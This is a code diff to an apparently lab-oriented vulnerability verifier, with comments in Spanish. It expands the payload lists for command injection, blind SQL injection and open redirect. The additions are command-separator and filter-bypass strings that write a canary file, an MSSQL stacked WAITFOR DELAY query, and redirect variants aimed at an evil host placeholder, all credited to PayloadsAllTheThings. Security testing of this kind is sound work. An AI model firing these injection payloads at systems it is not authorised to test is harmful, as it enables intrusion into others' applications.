@@ -19,8 +19,8 @@ import time
 from typing import Callable, List, Optional
 
 from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _PATH_HINTS, _REDIRECT_HINTS, _SQLI_HINTS,
-                       _URL_HINTS, _XML_HINTS, _docker_daemon_ok, _lab_host, _pick_param, _run,
-                       _token)
+                       _URL_HINTS, _XML_HINTS, _docker_daemon_ok, _lab_host, _pick_param,
+                       _redirect_location_is_external, _run, _token)
 import secrets
 
 _COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")
@@ -303,12 +303,24 @@ def verify_generic_command_injection(
         res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                              "metodo": m, "canary_path": canary_path, "canary_secret": secret})
 
+        # separadores reales de command injection (sh/bash/dash/ash) -- casuistica de
+        # Command Injection/Intruder/command_exec.txt en PayloadsAllTheThings: los separadores
+        # estandar (; | || && salto de linea), sustitucion de comandos (funciona aunque el valor
+        # ya este entre comillas/concatenado), rotura de contexto de comillas, y bypass de
+        # filtro de espacios via ${IFS}/%09 (comun cuando el codigo bloquea el caracter espacio
+        # pero no el separador de comando).
         payload_forms = [
             f"; echo {secret} > {canary_path}",
             f"| echo {secret} > {canary_path}",
+            f"|| echo {secret} > {canary_path}",
+            f"&& echo {secret} > {canary_path}",
+            f"\necho {secret} > {canary_path}\n",
             f"`echo {secret} > {canary_path}`",
             f"$(echo {secret} > {canary_path})",
-            f"&& echo {secret} > {canary_path}",
+            f"' ; echo {secret} > {canary_path} ; '",
+            f'" ; echo {secret} > {canary_path} ; "',
+            f";echo${{IFS}}{secret}>{canary_path}",
+            f";echo%09{secret}>{canary_path}",
         ]
         candidate_params = [cmd_param_hint] if cmd_param_hint else (
             list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or []))
@@ -693,6 +705,32 @@ def verify_generic_sqli_blind(
                              f"por tiempo, no ruido de red/Docker.")
                         break
 
+        # MSSQL: WAITFOR DELAY es una INSTRUCCION, no una funcion que valga dentro de un AND/OR --
+        # necesita una query APILADA (';' cierra el SELECT original y abre una nueva). Casuistica
+        # real de SQL Injection/Intruder/Generic_TimeBased.txt en PayloadsAllTheThings. Se prueba
+        # aparte porque su forma no encaja en el bucle de arriba (SLEEP()/pg_sleep() si valen
+        # dentro de una condicion AND/OR).
+        if not found:
+            waitfor_secs = f"0:0:{_SQLI_SLEEP_SECONDS:.0f}"
+            for ctx in ("", "'", "')", '")'):
+                if found:
+                    break
+                payload_val = f"{orig_value}{ctx};WAITFOR DELAY '{waitfor_secs}'--"
+                step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (MSSQL WAITFOR, "
+                     f"time-based)...")
+                t1 = timed_send(payload_val)
+                t2 = timed_send(payload_val)
+                entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
+                         "tiempo_2_s": round(t2, 2) if t2 else None}
+                tried.append(entry)
+                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
+                    found = True
+                    res.evidence["payload_ganador"] = payload_val
+                    res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
+                    res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
+                    step(f"VERIFICADO (MSSQL WAITFOR): {sqli_param}={payload_val!r} retraso la "
+                         f"respuesta de forma CONSISTENTE en 2 repeticiones independientes.")
+
         res.evidence["intentos"] = tried
         if found:
             res.verified = True
@@ -917,6 +955,10 @@ def verify_generic_open_redirect(
             f"\thttps://{evil_host}/pwned",
             f"https://{evil_host}#@trusted.example.com/",
             f"https://trusted.example.com.{evil_host}/pwned",
+            # triple/cuadruple slash y slash inicial delante de URL absoluta -- casuistica real
+            # de Open Redirect/Intruder/Open-Redirect-payloads.txt en PayloadsAllTheThings.
+            f"///{evil_host}/pwned", f"////{evil_host}/pwned",
+            f"/https://{evil_host}/pwned",
         ]
         m = (http_method or "GET").upper()
         tried = []
@@ -934,7 +976,7 @@ def verify_generic_open_redirect(
                 continue
             location = resp.headers.get("Location", "")
             is_redirect = resp.status_code in (301, 302, 303, 307, 308)
-            confirmed = is_redirect and evil_host in location
+            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
             tried.append({"target": target, "status": resp.status_code, "location": location,
                          "confirmado": confirmed})
             if confirmed:
